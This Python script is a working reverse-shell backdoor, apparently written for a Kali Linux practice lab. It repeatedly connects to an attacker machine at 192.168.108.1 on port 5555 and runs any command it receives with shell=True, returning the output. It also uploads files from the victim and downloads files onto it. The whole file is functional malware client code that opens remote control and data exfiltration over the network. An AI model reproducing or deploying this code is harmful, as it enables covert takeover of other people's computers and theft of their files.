import os
import socket
import subprocess
import time
import json



def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue




def conection():
    while True:
        #this loop funtion is infinity loop it will trying to connect kali every 20 seconds
        time.sleep(20)
        try:
            s.connect(('192.168.108.1', 5555))
            #it's kali linux IP and Port
            shell()
            s.close()
            break
        except:
            conection()

def upload_file(file_name):
    f = open(file_name,'rb')
    s.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk=s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8]=='download':
            upload_file(command[9:])
        elif command[:6]=='upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)



s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#socket.AF_INET is use to make connection over IPV4
#socket.SOCK_STREAM is use to establish connection of TCP
conection()